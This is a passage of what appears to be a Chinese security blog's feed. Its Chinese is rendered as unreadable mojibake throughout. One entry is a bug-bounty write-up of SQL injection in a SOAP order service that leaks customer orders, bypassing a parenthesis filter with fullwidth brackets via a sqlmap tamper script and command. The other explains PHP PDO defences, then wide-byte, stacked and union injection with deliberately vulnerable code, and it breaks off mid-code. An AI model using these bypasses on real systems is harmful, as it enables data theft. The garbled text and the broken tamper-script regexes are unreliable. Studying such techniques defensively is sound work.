        <content type="html"><![CDATA[<h2 id="0x01-æŒ–æ˜è¿‡ç¨‹"><a href="#0x01-æŒ–æ˜è¿‡ç¨‹" class="headerlink" title="0x01 æŒ–æ˜è¿‡ç¨‹"></a>0x01 æŒ–æ˜è¿‡ç¨‹</h2><p>åœ¨å¯¹æŸSRCæµ‹è¯•æ—¶ï¼Œæœ¬äººæ ¹æ®å…¶è¯ä¹¦ä¿¡æ¯æ”¶é›†åˆ°äº†éƒ¨åˆ†æ·±åº¦å­åŸŸï¼Œå¹¶æ‰¾åˆ°äº†å…¶å¯¹åº”çš„ä¸šåŠ¡IPæ®µ å†™äº†ä¸ªshellè„šæœ¬+ffufæ‰¹é‡fuzzæŸsrc cæ®µèµ„äº§ç›®å½• </p><p>å‘ç°äº†xxSRC cæ®µçš„ä¸€ä¸ªæä¾›äº†webserviceçš„æœåŠ¡å™¨ </p><p><a href="http://180.x.x.x/webservice/">http://180.x.x.x/webservice/</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192133741.png" alt="image-20230419210644326"></p><p>è·å–åˆ°æ¥å£<br><a href="http://180.x.x.x/webservice/syncOrderToOdcService">http://180.x.x.x/webservice/syncOrderToOdcService</a></p><p>ä½¿ç”¨soup ui è¿›è¡Œè°ƒè¯•</p><p>æ•°æ®</p><pre><code class="xml">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:odc=&quot;http://odc.ws.qiku.com/&quot;&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;odc:syncOrderInfo&gt;&lt;!--Optional:--&gt;&lt;arg0&gt;&lt;/arg0&gt;&lt;/odc:syncOrderInfo&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;&lt;arg0&gt;&lt;/arg0&gt;</code></pre><p>å½“<arg0></arg0>ä¸­é—´æ— å‚æ•°å€¼æ—¶</p><p>Soapæ¥å£æŠ›å‡ºäº†ä¸€ä¸ªOracleçš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶æç¤ºâ€œDate format error,YY-MM-DDâ€</p><p>éšåå¾ˆç®€å•äº†ï¼Œæ„é€ ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„dateæ•°æ®</p><pre><code>2021-9-23</code></pre><p>Soap requestï¼š</p><pre><code class="xml">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:odc=&quot;http://odc.ws.qiku.com/&quot;&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;odc:syncOrderInfo&gt;&lt;!--Optional:--&gt;&lt;arg0&gt;2021-9-23&lt;/arg0&gt;&lt;/odc:syncOrderInfo&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192133888.png" alt="image-20230419210707743"></p><p>arg0å¤„ä¸ºæ—¥æœŸå‚æ•°ï¼ŒæŒ‡å®šæ—¥æœŸï¼Œå³å¯æŸ¥è¯¢åˆ°xx srcå•†åŸæ‰€æœ‰è®¢å•ä¿¡æ¯</p><p>å±äºä¸¥é‡æ³„éœ²å®¢æˆ·æ•°æ®çš„æ¼æ´</p><h2 id="0x03-Soapæ¥å£çš„æ³¨å…¥"><a href="#0x03-Soapæ¥å£çš„æ³¨å…¥" class="headerlink" title="0x03 Soapæ¥å£çš„æ³¨å…¥"></a>0x03 Soapæ¥å£çš„æ³¨å…¥</h2><p>çœ‹äº†ä¸€ä¸‹oracleéƒ½çˆ†å‡ºSQLçš„é”™è¯¯ä¿¡æ¯äº†ï¼Œå¹¶ä¸”æ²¡æœ‰é¢„ç¼–è¯‘ç›¸å…³çš„æç¤ºï¼Œè¿™ä¸å¾—æ³¨å…¥ä¸€æ³¢ï¼Ÿ</p><p>ä½†æ˜¯åœ¨æ³¨å…¥çš„æ—¶å€™å‘ç°ç¨‹åºä¼šå°†æ‹¬å·()è¿‡æ»¤æ‰ï¼Œå¯¼è‡´å‡½æ•°æ— æ³•æ‰§è¡Œï¼Œsqlmapæ³¨å…¥ä¸å‡ºæ¥</p><p>è¿™æ—¶å€™å°±è¦ç”¨åˆ°éªšå§¿åŠ¿äº†</p><p>åœ¨Oracleä¸­,ä¸­æ–‡æ‹¬å·ï¼ˆï¼‰å¯ä»¥ä»£æ›¿è‹±æ–‡()è€Œä¸”ä¸æŠ¥é”™ï¼</p><p>EG:</p><pre><code># çº¯ä¸­æ–‡æ‹¬å·SQL&gt; select ï¼ˆ1+1ï¼‰ from dual;   ï¼ˆ1+1ï¼‰----------         2</code></pre><p>å‰©ä¸‹çš„å°±å¾ˆç®€å•äº†ï¼Œæ”¹ä¸€ä¸ªtamperå‡ºæ¥</p><pre><code class="python">#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2016 sqlmap developers ([url]http://sqlmap.org/[/url])See the file &#39;doc/COPYING&#39; for copying permission&quot;&quot;&quot;import osimport refrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMSfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHESTdef dependencies():    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is unlikely to work against %s&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.PGSQL))def tamper(payload, **kwargs):    retVal = payload    if payload:        retVal = re.sub(r&quot;\s*(\s*&quot;, &quot;ï¼ˆ&quot;, retVal)retVal = re.sub(r&quot;\s*)\s*&quot;, &quot;ï¼‰&quot;, retVal)return retVal</code></pre><blockquote><blockquote><p>python sqlmap.py -r xxx.txt â€“dbs â€“tamper&#x3D;brackets.py  &#x2F;&#x2F;æ³¨å…¥è¯·æ±‚ï¼Œåœ¨æ—¥æœŸå¤„åŠ *</p></blockquote></blockquote><p>wåˆ°æ‰‹ï¼Œæ”¶æ‘Š</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192133987.png" alt="image-20230419210733294"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»PDOä¸‹çš„æ³¨å…¥æ€è·¯åˆ°è·å¾—Git 3000staré¡¹ç›®0day</title>
      <link href="/2021/05/25/%E4%BB%8EPDO%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E5%88%B0%E8%8E%B7%E5%BE%97Git-3000star%E9%A1%B9%E7%9B%AE0day/"/>
      <url>/2021/05/25/%E4%BB%8EPDO%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E5%88%B0%E8%8E%B7%E5%BE%97Git-3000star%E9%A1%B9%E7%9B%AE0day/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-PDOç®€ä»‹"><a href="#0x01-PDOç®€ä»‹" class="headerlink" title="0x01 PDOç®€ä»‹"></a>0x01 PDOç®€ä»‹</h2><p>PDOå…¨åPHP Data Object</p><p>PDOæ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚PDOæä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚</p><p>PHPè¿æ¥MySQLæ•°æ®åº“æœ‰ä¸‰ç§æ–¹å¼ï¼ˆMySQLã€Mysqliã€PDOï¼‰ï¼Œåˆ—è¡¨æ€§æ¯”è¾ƒå¦‚ä¸‹ï¼š</p><table><thead><tr><th></th><th>Mysqli</th><th>PDO</th><th>MySQL</th></tr></thead><tbody><tr><td>å¼•å…¥çš„PHPç‰ˆæœ¬</td><td>5.0</td><td>5.0</td><td>3.0ä¹‹å‰</td></tr><tr><td>PHP5.xæ˜¯å¦åŒ…å«</td><td>æ˜¯</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>æœåŠ¡ç«¯prepareè¯­å¥çš„æ”¯æŒæƒ…å†µ</td><td>æ˜¯</td><td>æ˜¯</td><td>å¦</td></tr><tr><td>å®¢æˆ·ç«¯prepareè¯­å¥çš„æ”¯æŒæƒ…å†µ</td><td>å¦</td><td>æ˜¯</td><td>å¦</td></tr><tr><td>å­˜å‚¨è¿‡ç¨‹æ”¯æŒæƒ…å†µ</td><td>æ˜¯</td><td>æ˜¯</td><td>å¦</td></tr><tr><td>å¤šè¯­å¥æ‰§è¡Œæ”¯æŒæƒ…å†µ</td><td>æ˜¯</td><td>å¤§å¤šæ•°</td><td>å¦</td></tr></tbody></table><p>å¦‚éœ€åœ¨phpä¸­ä½¿ç”¨pdoæ‰©å±•ï¼Œéœ€è¦åœ¨php.iniæ–‡ä»¶ä¸­è¿›è¡Œé…ç½®</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640774.png" alt="image"></p><h2 id="0x02-PDOé˜²èŒƒSQLæ³¨å…¥"><a href="#0x02-PDOé˜²èŒƒSQLæ³¨å…¥" class="headerlink" title="0x02 PDOé˜²èŒƒSQLæ³¨å…¥"></a>0x02 PDOé˜²èŒƒSQLæ³¨å…¥</h2><h3 id="â‘ è°ƒç”¨æ–¹æ³•è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦"><a href="#â‘ è°ƒç”¨æ–¹æ³•è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="â‘ è°ƒç”¨æ–¹æ³•è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦"></a>â‘ è°ƒç”¨æ–¹æ³•è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦</h3><p><strong>quote()æ–¹æ³•(è¿™ç§æ–¹æ³•çš„åŸç†è·Ÿaddslasheså·®ä¸å¤šï¼Œéƒ½æ˜¯è½¬ä¹‰)</strong></p><p>PDOç±»åº“çš„quate()æ–¹æ³•ä¼šå°†è¾“å…¥å­—ç¬¦ä¸²ï¼ˆå¦‚æœéœ€è¦ï¼‰å‘¨å›´åŠ ä¸Šå¼•å·ï¼Œå¹¶åœ¨è¾“å…¥å­—ç¬¦ä¸²å†…è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>EGâ‘ :</p><pre><code class="PHP">&lt;?php$conn = new PDO(&#39;sqlite:/home/lynn/music.sql3&#39;);/* Dangerous string */$string = &#39;Naughty &#39; string&#39;;print &quot;Unquoted string: $stringn&quot;;print &quot;Quoted string:&quot; . $conn-&gt;quote($string) . &quot;n&quot;;?&gt;</code></pre><p>è¾“å‡º</p><pre><code class="php">Unquoted string: Naughty &#39; stringQuoted string: &#39;Naughty &#39;&#39; string&#39;</code></pre><p>EGâ‘¡</p><p>test.sql</p><pre><code>SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for user-- ----------------------------DROP TABLE IF EXISTS `user`;CREATE TABLE `user`  (  `id` int(10) NOT NULL,  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;-- ------------------------------ Records of user-- ----------------------------INSERT INTO `user` VALUES (0, &#39;admin&#39;, &#39;admin&#39;);INSERT INTO `user` VALUES (1, &#39;user&#39;, &#39;user&#39;);SET FOREIGN_KEY_CHECKS = 1;</code></pre><p>pdo.php</p><pre><code class="php">&lt;?phpheader(&#39;content-type=text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);     $username=$pdo-&gt;quote($username);     $password=$pdo-&gt;quote($password);    $sql=&quot;select * from user where username=&#123;$username&#125; and password=&#123;$password&#125;&quot;;    echo $sql.&quot;&lt;/br&gt;&quot;;    $row=$pdo-&gt;query($sql);    foreach ($row as $key =&gt; $value) &#123;        print_r($value);    &#125;&#125;catch(POOException $e)&#123;    echo $e-&gt;getMessage();&#125;</code></pre><p>è®¿é—®<a href="http://localhost/pdo.php?username=admin&password=admin">http://localhost/pdo.php?username=admin&amp;password=admin</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640915.png" alt="image"></p><p>å½“æˆ‘ä»¬ä½¿ç”¨å•å¼•å·æ¢æµ‹æ³¨å…¥æ—¶</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640974.png" alt="image"></p><p>å¦‚å›¾ï¼Œå•å¼•å·å·²è¢«åæ–œçº¿è½¬ä¹‰</p><h3 id="â‘¡é¢„ç¼–è¯‘è¯­å¥"><a href="#â‘¡é¢„ç¼–è¯‘è¯­å¥" class="headerlink" title="â‘¡é¢„ç¼–è¯‘è¯­å¥"></a>â‘¡<strong>é¢„ç¼–è¯‘è¯­å¥</strong></h3><p><strong>1ã€å ä½ç¬¦-é€šè¿‡å‘½åå‚æ•°é˜²æ­¢æ³¨å…¥</strong></p><p>é€šè¿‡å‘½åå‚æ•°é˜²æ­¢æ³¨å…¥çš„æ–¹æ³•ä¼šä½¿å¾—ç¨‹åºåœ¨æ‰§è¡ŒSQLè¯­å¥æ—¶ï¼Œå°†ä¼šæŠŠå‚æ•°å€¼å½“æˆä¸€ä¸ªå­—ç¬¦ä¸²æ•´ä½“æ¥è¿›è¡Œå¤„ç†ï¼Œå³ä½¿å‚æ•°å€¼ä¸­åŒ…å«å•å¼•å·ï¼Œä¹Ÿä¼šæŠŠå•å¼•å·å½“æˆå•å¼•å·å­—ç¬¦ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²çš„èµ·æ­¢ç¬¦ã€‚è¿™æ ·å°±åœ¨æŸç§ç¨‹åº¦ä¸Šæ¶ˆé™¤äº†SQLæ³¨å…¥æ”»å‡»çš„æ¡ä»¶ã€‚</p><p>å°†åŸæ¥çš„SQLæŸ¥è¯¢è¯­å¥æ”¹ä¸º</p><pre><code>Select * from where name=:username and password=:password</code></pre><p>prepareæ–¹æ³•è¿›è¡ŒSQLè¯­å¥é¢„ç¼–è¯‘</p><p>æœ€åé€šè¿‡è°ƒç”¨rowCount()æ–¹æ³•ï¼ŒæŸ¥çœ‹è¿”å›å—sqlè¯­å¥å½±å“çš„è¡Œæ•°</p><p>è¿”å›0è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œå¤§äºç­‰äº1ï¼Œåˆ™è¡¨ç¤ºè¯­å¥æ‰§è¡ŒæˆåŠŸã€‚</p><p>All code</p><pre><code>&lt;?phpheader(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;execute(array(&quot;:username&quot;=&gt;$username,&quot;:password&quot;=&gt;$password));    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>æŸ¥è¯¢æˆåŠŸ</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="æŸ¥è¯¢æˆåŠŸ"></p><p>æ³¨å…¥å¤±è´¥</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p><strong>2ã€å ä½ç¬¦-é€šè¿‡é—®å·å ä½ç¬¦é˜²æ­¢æ³¨å…¥</strong></p><p>æŠŠSQLè¯­å¥å†è¿›è¡Œä¿®æ”¹</p><pre><code class="sql">select * from user where name=? and password=?</code></pre><p>åŒä¸Šï¼Œprepareæ–¹æ³•è¿›è¡ŒSQLè¯­å¥é¢„ç¼–è¯‘</p><p>æœ€åè°ƒç”¨rowCount()æ–¹æ³•ï¼ŒæŸ¥çœ‹è¿”å›å—sqlè¯­å¥å½±å“çš„è¡Œæ•°</p><pre><code class="php">&lt;?header(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&quot;select * from user where username=? and password=?&quot;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;execute(array($username,$password));    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>æ•ˆæœåŒä¸Š</p><p>æŸ¥è¯¢æˆåŠŸ</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="æŸ¥è¯¢æˆåŠŸ"></p><p>æ³¨å…¥å¤±è´¥</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p><strong>3.é€šè¿‡bindParam()æ–¹æ³•ç»‘å®šå‚æ•°é˜²å¾¡SQLæ³¨å…¥</strong></p><p>ä¿®æ”¹è¯­å¥éƒ¨åˆ†</p><pre><code class="php">$sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);</code></pre><p><strong>è§£é‡Šï¼š</strong><br>a)ï¼š:username å’Œ :passwordä¸ºå‘½åå‚æ•°<br>b)ï¼š$username;$passwordä¸ºè·å–çš„å˜é‡ï¼Œå³ç”¨æˆ·åå’Œå¯†ç ã€‚<br>c)ï¼šPDO::PARAM_STR,è¡¨ç¤ºå‚æ•°å˜é‡çš„å€¼ä¸€å®šè¦ä¸ºå­—ç¬¦ä¸²ï¼Œå³ç»‘å®šå‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ã€‚åœ¨bindparam()æ–¹æ³•ä¸­ï¼Œé»˜è®¤ç»‘å®šçš„å‚æ•°ç±»å‹å°±æ˜¯å­—ç¬¦ä¸²ã€‚</p><p>â€‹       å½“ä½ è¦æ¥å—intå‹æ•°æ®çš„æ—¶å€™å¯ä»¥ç»‘å®šå‚æ•°ä¸ºPDO::PARAM_INT.</p><pre><code class="php">&lt;?phpheader(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GETT[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);    $stmt-&gt;execute();    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>æ•ˆæœåŒä¸Š</p><p>æŸ¥è¯¢æˆåŠŸ</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="æŸ¥è¯¢æˆåŠŸ"></p><p>æ³¨å…¥å¤±è´¥</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p>è¿™åªæ˜¯æ€»ç»“äº†ä¸€éƒ¨åˆ†PDOé˜²èŒƒSQLæ³¨å…¥çš„æ–¹æ³•ï¼Œä»æœ‰æ–¹æ³•è¯·è§ä¸‹æ–‡</p><p>å…¶ä»–æ‰‹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œå¤§å®¶æ„Ÿå…´è¶£çš„è¯å¯ä»¥è‡ªè¡Œç ”ç©¶</p><h2 id="0x03-PDOä¸‹çš„æ³¨å…¥æ‰‹æ³•ä¸æ€è€ƒ"><a href="#0x03-PDOä¸‹çš„æ³¨å…¥æ‰‹æ³•ä¸æ€è€ƒ" class="headerlink" title="0x03 PDOä¸‹çš„æ³¨å…¥æ‰‹æ³•ä¸æ€è€ƒ"></a>0x03 PDOä¸‹çš„æ³¨å…¥æ‰‹æ³•ä¸æ€è€ƒ</h2><p>è¯»å®Œå‰æ–‡åï¼Œè¯»è€…ä»¬å¯èƒ½ä¸ç”±æ„Ÿå¹ï¼ŒçœŸç‹ å•Šï¼Œä»€ä¹ˆéƒ½tmdè½¬ä¹‰ï¼Œä»€ä¹ˆè¯­å¥éƒ½é¢„ç¼–è¯‘äº†ï¼Œè¿™æˆ‘tmdæ³¨å…¥ä¸ªæ¯›â€¦</p><p><img src="https://i.loli.net/2021/05/25/k3VIpq2GndYDKhg.png" alt="image-20210525143226397"></p><p><img src="https://i.loli.net/2021/05/25/mgUREqoKWj2Lc1O.jpg" alt="img"></p><p>åŒ—å®‹å®°ç›¸ç‹å®‰çŸ³æœ‰è¨€â€œçœ‹ä¼¼å¯»å¸¸æœ€å¥‡å´›,æˆå¦‚å®¹æ˜“å´è‰°è¾›â€</p><p>è®©æˆ‘ä»¬æŠ½ä¸å‰¥èŒ§æ¥æ¢å¯»PDOä¸‹çš„æ³¨å…¥æ‰‹æ³•</p><p>ç›®å‰åœ¨PDOä¸‹ï¼Œæ¯”è¾ƒé€šç”¨çš„æ‰‹æ³•ä¸»è¦æœ‰å¦‚ä¸‹ä¸¤ç§</p><h3 id="â‘ å®½å­—èŠ‚æ³¨å…¥"><a href="#â‘ å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="â‘ å®½å­—èŠ‚æ³¨å…¥"></a><strong>â‘ å®½å­—èŠ‚æ³¨å…¥</strong></h3><p>æ³¨å…¥çš„åŸç†å°±ä¸è®²äº†ï¼Œç›¸ä¿¡å¤§å®¶éƒ½çŸ¥é“</p><p>ä¸€å¼ å›¾ï¼Œæ¸…æ™°æ˜äº†</p><p><img src="https://i.loli.net/2021/05/25/Vl2qxBSFykeNp5h.png" alt="image-20210525144401689"></p><p>å½“Mysqlæ•°æ®åº“my.iniæ–‡ä»¶ä¸­è®¾ç½®ç¼–ç ä¸ºgbkæ—¶ï¼Œ</p><p>æˆ‘ä»¬çš„PHPç¨‹åºå“ªæ€•ä½¿ç”¨äº†addslashes()ï¼ŒPDO::quoteï¼Œmysql_real_escape_string()ã€mysql_escape_string()ç­‰å‡½æ•°ã€æ–¹æ³•ï¼Œæˆ–é…ç½®äº†magic_quotes_gpc&#x3D;onï¼Œä¾ç„¶å¯ä»¥é€šè¿‡æ„é€ %dfâ€™çš„æ–¹æ³•ç»•è¿‡è½¬ä¹‰</p><h3 id="â‘¡å †å æ³¨å…¥ä¸æŠ¥é”™æ³¨å…¥"><a href="#â‘¡å †å æ³¨å…¥ä¸æŠ¥é”™æ³¨å…¥" class="headerlink" title="â‘¡å †å æ³¨å…¥ä¸æŠ¥é”™æ³¨å…¥"></a>â‘¡å †å æ³¨å…¥ä¸æŠ¥é”™æ³¨å…¥</h3><p>PDOåˆ†ä¸º<strong>æ¨¡æ‹Ÿé¢„å¤„ç†</strong>å’Œ<strong>éæ¨¡æ‹Ÿé¢„å¤„ç†</strong>ã€‚</p><p><strong>æ¨¡æ‹Ÿé¢„å¤„ç†æ˜¯é˜²æ­¢æŸäº›æ•°æ®åº“ä¸æ”¯æŒé¢„å¤„ç†è€Œè®¾ç½®çš„ï¼Œä¹Ÿæ˜¯ä¼—å¤šæ³¨å…¥çš„å…ƒå‡¶</strong></p><p>åœ¨åˆå§‹åŒ–PDOé©±åŠ¨æ—¶ï¼Œå¯ä»¥è®¾ç½®ä¸€é¡¹å‚æ•°ï¼ŒPDO::ATTR_EMULATE_PREPARESï¼Œä½œç”¨æ˜¯æ‰“å¼€æ¨¡æ‹Ÿé¢„å¤„ç†(true)æˆ–è€…å…³é—­(false),é»˜è®¤ä¸ºtrueã€‚</p><p>PDOå†…éƒ¨ä¼šæ¨¡æ‹Ÿå‚æ•°ç»‘å®šçš„è¿‡ç¨‹ï¼ŒSQLè¯­å¥æ˜¯åœ¨æœ€åexecute()çš„æ—¶å€™æ‰å‘é€ç»™æ•°æ®åº“æ‰§è¡Œã€‚</p><p><strong>éæ¨¡æ‹Ÿé¢„å¤„ç†åˆ™æ˜¯é€šè¿‡æ•°æ®åº“æœåŠ¡å™¨æ¥è¿›è¡Œé¢„å¤„ç†åŠ¨ä½œï¼Œä¸»è¦åˆ†ä¸ºä¸¤æ­¥ï¼š</strong></p><p>ç¬¬ä¸€æ­¥æ˜¯prepareé˜¶æ®µï¼Œå‘é€SQLè¯­å¥æ¨¡æ¿åˆ°æ•°æ®åº“æœåŠ¡å™¨ï¼›</p><p>ç¬¬äºŒæ­¥é€šè¿‡execute()å‡½æ•°å‘é€å ä½ç¬¦å‚æ•°ç»™æ•°æ®åº“æœåŠ¡å™¨æ‰§è¡Œã€‚</p><p><strong>PDOäº§ç”Ÿå®‰å…¨é—®é¢˜çš„ä¸»è¦è®¾ç½®å¦‚ä¸‹ï¼š</strong></p><blockquote><p>â€‹    PDO::ATTR_EMULATE_PREPARES    &#x2F;&#x2F;æ¨¡æ‹Ÿé¢„å¤„ç†(é»˜è®¤å¼€å¯)</p><p>â€‹    PDO::ATTR_ERRMODE      &#x2F;&#x2F;æŠ¥é”™</p><p>â€‹    PDO::MYSQL_ATTR_MULTI_STATEMENTS      &#x2F;&#x2F;å…è®¸å¤šå¥æ‰§è¡Œ(é»˜è®¤å¼€å¯)</p></blockquote><p>PDOé»˜è®¤æ˜¯å…è®¸å¤šå¥æ‰§è¡Œå’Œæ¨¡æ‹Ÿé¢„ç¼–è¯‘çš„ï¼Œåœ¨ç”¨æˆ·è¾“å…¥å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´å †å æ³¨å…¥ã€‚</p><h4 id="2-1-æ²¡æœ‰è¿‡æ»¤çš„å †å æ³¨å…¥æƒ…å†µ"><a href="#2-1-æ²¡æœ‰è¿‡æ»¤çš„å †å æ³¨å…¥æƒ…å†µ" class="headerlink" title="2.1 æ²¡æœ‰è¿‡æ»¤çš„å †å æ³¨å…¥æƒ…å†µ"></a>2.1 æ²¡æœ‰è¿‡æ»¤çš„å †å æ³¨å…¥æƒ…å†µ</h4><pre><code class="php">&lt;?phpheader(&#39;content-type=text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&quot;select * from user where username=&#39;&#123;$username&#125;&#39; and password=&#39;&#123;$password&#125;&#39;&quot;;    echo $sql.&quot;&lt;/br&gt;&quot;;    $row=$pdo-&gt;query($sql);    foreach ($row as $key =&gt; $value) &#123;        print_r($value);    &#125;&#125;catch(POOException $e)&#123;    echo $e-&gt;getMessage();&#125;</code></pre><p>å› ä¸ºåœ¨$pdo&gt;query()æ‰§è¡Œä¹‹å‰ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹$sqlè¿›è¡Œéæ³•æ“ä½œï¼Œé‚£PDOç›¸å½“äºæ²¡ç”¨</p><p><img src="https://i.loli.net/2021/05/25/iRY4JqCXH3TBZt1.png" alt="image-20210525161109702"></p><p><img src="https://i.loli.net/2021/05/25/zfiamDTkusvMg45.png" alt="image-20210525160856876"></p><p>å¦‚æœæƒ³ç¦æ­¢å¤šè¯­å¥æ‰§è¡Œï¼Œå¯åœ¨åˆ›å»ºPDOå®ä¾‹æ—¶å°†PDO::MYSQL_ATTR_MULTI_STATEMENTSè®¾ç½®ä¸ºfalse</p><pre><code class="php">new PDO($dsn, $user, $pass, array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))</code></pre><p>ä½†æ˜¯å“ªæ€•ç¦æ­¢äº†å¤šè¯­å¥æ‰§è¡Œï¼Œä¹Ÿåªæ˜¯é˜²èŒƒäº†å †å æ³¨å…¥è€Œå·²ï¼Œç›´æ¥unionå³å¯</p><p><img src="https://i.loli.net/2021/05/25/qMptNExXKOeD27k.png" alt="image-20210525191231332"></p><h4 id="2-2-æ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ"><a href="#2-2-æ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ" class="headerlink" title="2.2 æ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ"></a>2.2 æ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ</h4><pre><code class="php">&lt;?phptry &#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    //$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);    $username = $_GET[&#39;username&#39;];    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;    $stmt = $pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(1,$username);    $stmt-&gt;execute();    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))    &#123;        var_dump($row);        echo &quot;&lt;br&gt;&quot;;    